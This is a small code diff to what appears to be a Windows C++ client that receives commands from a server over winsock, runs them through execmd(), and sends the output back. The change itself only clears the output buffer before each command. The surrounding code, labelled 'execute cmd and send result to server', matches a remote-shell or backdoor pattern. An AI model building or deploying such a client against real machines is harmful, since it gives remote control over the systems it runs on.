@@ -2,8 +2,6 @@
 //
 
 #include "stdafx.h"
-
-
 #include <iostream>
 #include <winsock2.h>
 
@@ -187,7 +185,7 @@ int main(int argc, char * argv[])
 			case CMD_CMD:
 				printf("cmd: %s\n", pStrCmd);
 				// execute cmd and send result to server
-				//system(pStrCmd);
+				memset(cmdbuffer, 0, sizeof(cmdbuffer));
 				suc = execmd(pStrCmd,cmdbuffer);
 				int iResult;
 				if (suc) iResult = send(ClientSocket, cmdbuffer, DEFAULT_BUFLEN, 0);
